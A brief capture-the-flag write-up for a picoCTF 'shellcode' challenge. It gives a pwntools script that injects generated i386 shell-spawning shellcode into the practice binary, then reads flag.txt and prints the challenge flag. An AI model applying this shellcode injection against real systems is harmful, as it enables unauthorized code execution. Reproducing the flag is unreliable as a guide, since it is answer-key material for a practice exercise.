[Category:Picoctf](/Category:Picoctf "wikilink") This program executes
any input you give it. Can you get a shell? You can find the program in
/problems/shellcode_1_cec2eb801137d645a9f15b9b6af5347a on the shell
server. Source.

`python2`
`>>>`
`from pwn import *`
`sh = process('./vuln')`
`sh.sendlineafter('!\n', asm(shellcraft.i386.linux.sh()))`
`sh.interactive()`

we start the process with pwntools and send assembly of a shell. after
this we get an interactive session and we can do:

`cat flag.txt`

picoCTF{shellc0de_w00h00_26e91a77}